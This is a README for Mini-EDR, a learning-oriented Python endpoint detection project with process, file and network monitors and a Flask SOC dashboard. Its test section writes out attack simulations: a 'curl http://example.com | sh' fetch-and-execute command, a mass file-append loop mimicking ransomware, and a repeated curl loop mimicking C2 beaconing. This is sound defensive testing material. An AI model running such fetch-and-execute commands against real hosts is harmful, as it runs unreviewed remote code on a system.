✅ FINAL PROFESSIONAL README.md
# 🛡️ Mini-EDR – Endpoint Detection & Response System

Mini-EDR is a **behavior-based Endpoint Detection & Response (EDR)** system built using Python.
It monitors **process activity, file system behavior, and network traffic** to detect:

- Suspicious script execution
- Ransomware-like mass file modification
- Possible C2 (Command & Control) network beaconing

The project also includes a **SOC-style web dashboard** to visualize security alerts.

---

## 📂 Project Location



/home/baby/pro1/mini-edr


---

## 🧱 Project Structure



mini-edr/
├── agent/
│ ├── process_monitor.py # Detects malicious process behavior
│ ├── file_monitor.py # Detects ransomware-style file activity
│ ├── network_monitor.py # Detects C2-like network beaconing
│
├── server/
│ ├── detector.py # Central detection & correlation engine
│ ├── dashboard.py # SOC-style Flask dashboard
│
├── monitored_dir/ # Directory used for ransomware testing
├── logs/
│ └── edr.log # Central JSON event log
│
├── start_edr.sh # Service launcher script
├── README.md
├── .gitignore
└── venv/ # Python virtual environment (not pushed to GitHub)


---

## ⚙️ Requirements

- Linux (tested on Debian / Kali / Ubuntu)
- Python 3.9+
- Internet access (for network testing)

---

## 🛠️ Installation

```bash
cd /home/baby/pro1/mini-edr

python3 -m venv venv
source venv/bin/activate

pip install psutil watchdog flask requests

▶️ How to Run (Step-by-Step)
🔹 Terminal 1 – Process Monitoring
source venv/bin/activate
python agent/process_monitor.py

🔹 Terminal 2 – File / Ransomware Monitoring
source venv/bin/activate
python agent/file_monitor.py

🔹 Terminal 3 – Network Monitoring
source venv/bin/activate
python agent/network_monitor.py

🔹 Terminal 4 – Detection Engine
source venv/bin/activate
python server/detector.py

🔹 Terminal 5 – SOC Dashboard
source venv/bin/activate
python server/dashboard.py


Open browser:

http://127.0.0.1:5001

🧪 Testing Scenarios
🧨 Ransomware Simulation (Mass File Modification)
cd monitored_dir
for i in {1..30}; do echo "encrypt" >> file$i.txt; done


✔ Expected:

HIGH severity alert

Reason: Possible ransomware behavior (mass file modification)

🌐 Network Detection Test (C2-like Behavior)
for i in {1..10}; do curl http://example.com; done


✔ Expected:

Network alert triggered

Reason: Possible C2 beaconing (repeated outbound connections)

🧪 Process-Based Attack Simulation
bash -c "curl http://example.com | sh"


✔ Expected:

Process alert

Reason: Script downloading from internet

🚨 Alert Types
Type	Description
PROCESS	Suspicious script execution
FILE	Ransomware-style file behavior
NETWORK	Possible C2 beaconing

Only high-severity alerts are shown on the dashboard to reduce noise.

📊 SOC Dashboard

Clean tabular view

Real-time alert updates

Only critical events displayed

Designed like a SOC analyst console

🎥 Demo Video (YouTube)

📺 Project Demo:
👉 (Add your YouTube video link here)

The demo explains:

Architecture

Live attack simulation

Dashboard alerts

Detection logic

🧠 Architecture Overview
[Agent Layer]
  ├─ Process Monitor
  ├─ File Monitor
  ├─ Network Monitor
        ↓
[Central Log: edr.log]
        ↓
[Detection Engine]
        ↓
[SOC Dashboard]

🔐 Hardening Techniques Used

Alert deduplication

Cooldown-based detection

Allowlisting to reduce false positives

Incident-level alerting

⚠️ Limitations

User-space monitoring (no kernel hooks)

Designed for learning & demonstration

Not a replacement for enterprise EDR

🎯 Use Cases

Blue Team practice

Detection engineering learning

SOC analyst portfolio project

Interview demonstrations